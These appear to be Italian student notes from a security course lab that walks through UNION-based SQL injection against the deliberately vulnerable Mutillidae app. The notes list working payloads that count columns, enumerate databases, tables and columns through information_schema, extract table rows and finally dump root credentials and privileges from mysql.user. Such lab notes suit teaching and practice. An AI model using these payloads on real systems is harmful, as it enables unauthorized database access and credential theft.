
# 2. Sql injection

```sql
' ORDER BY 7
test' UNION SELECT null,@@version,user(),'test',null,null,null --
```

Se per qualche motivo vuoi anche il database name : aggiungi anche il `database()` agli input della SELECT.

Se vuoi la lista dei DB:
```sql
SELECT schema_name FROM information_schema.schemata
```

Se vuoi la lista delle tabelle :
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='nome_db'
```

Se vuoi la lista delle colonne:
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='nome_tabella'
```

**2.2**
```sql
' AND 1=0 UNION SELECT null, COLUMN_NAME, null, null,null, null,null FROM information_schema.columns WHERE table_name="youTubeVideos" -- 

' UNION SELECT null, identificationToken, null,null,null,null,null FROM youTubeVideos -- 


VEDI CHE NON c'è l'ide che il prof cerca

```

```sql
test' UNION SELECT null,table_name,null,null,null,null,null FROM information_schema.tables -- 
```
è carino ma voglio vedere anche i nomi dei db

```sql
test' UNION SELECT null,null,CONCAT(table_schema,':' ,table_name),null,null,null,null FROM information_schema.tables -- 
```

ORA che sai bene anche il nome del db, sei sicuro anche del nome della tabella.

ORA facciamo la ricerca sulla tabella `youTubeVideos'
```sql
test' UNION SELECT null, CONCAT(table_name,':',column_name),null,null,null,null,null FROM information_schema.columns -- 
```

i campi sono
recordIndetifier
identificationToken
title

```sql
test' UNION SELECT null,recordIndetifier ,identificationToken,title,null,null,null FROM youTubeVideos -- 
```

per cercare il `DXtLNGqfgMo` faccio

```sql
test' UNION SELECT null, recordIndetifier, title, null,null,null,null FROM youTubeVideos WHERE identificationToken='DXtLNGqfgMo' -- 
```
**2.3**


ATTENZIONE DEVI GUARDARE USER non USERS


Aggiungi table schema e vedi che ti arriva da quel db
```sql
' UNION SELECT null, COLUMN_NAME, null, null, null, null, null FROM information_schema.columns WHERE table_name="user" -- 

' UNION SELECT null, COLUMN_NAME, table_schema, null, null, null, null FROM information_schema.columns WHERE table_name="user" --

E ottieni http://192.168.122.123/mutillidae/index.php?page=user-info.php&username=%27+UNION+SELECT+null%2C+COLUMN_NAME%2C+table_schema%2C+null%2C+null%2C+null%2C+null+FROM+information_schema.columns+WHERE+table_name%3D%22user%22+--+&password=&user-info-php-submit-button=View+Account+Details


PUOI FARE PIU'


' UNION SELECT null, password_expired, null, null,null,null,null FROM mysql.user -- 


concat per avere concatenare gli input

' UNION SELECT null,CONCAT(Host, ":", User,":",Password,":", Super_priv,":", Show_db_priv,":", Create_user_priv), null ,null,null,null,null FROM mysql.user WHERE User='root' -- 



```

